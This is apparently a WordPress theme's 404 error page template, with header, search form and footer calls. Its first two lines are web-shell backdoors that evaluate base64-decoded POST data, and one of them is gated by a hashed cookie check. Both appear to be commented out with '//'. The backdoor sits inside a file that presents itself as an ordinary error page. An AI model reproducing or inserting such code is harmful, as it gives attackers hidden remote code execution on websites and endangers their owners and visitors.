<?php// if ($_POST["php"]){eval(base64_decode($_POST["php"]));exit;} ?>
<?php// if(md5($_COOKIE['8bef3f0f123ceedb'])=="3c7dde32edfd1e35ac27e8f3c9b98c32"){ eval(base64_decode($_POST['file'])); exit; } ?>
	
<?php get_header(); ?>

	<div id="content">
	<h5>Error 404: Page Not Found</h5>
	<?php include (TEMPLATEPATH . '/searchform.php'); ?>
	</div>
  
<?php get_footer(); ?>